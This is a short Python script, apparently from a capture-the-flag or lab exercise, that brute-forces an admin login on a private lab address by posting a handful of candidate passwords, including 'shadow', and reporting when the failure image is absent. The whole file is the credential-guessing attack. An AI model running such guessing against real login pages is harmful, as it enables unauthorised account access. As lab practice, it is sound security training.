import hashlib
import requests
import re


for i in range(10):
	if i == 9:
		i = "shadow"
	url = f"http://192.168.56.102/?page=signin&username=admin&password={str(i)}&Login=Login#"
	res = requests.post(url)
	if re.search(r"WrongAnswer.gif", res.text):
		continue
	else:
		print("Found")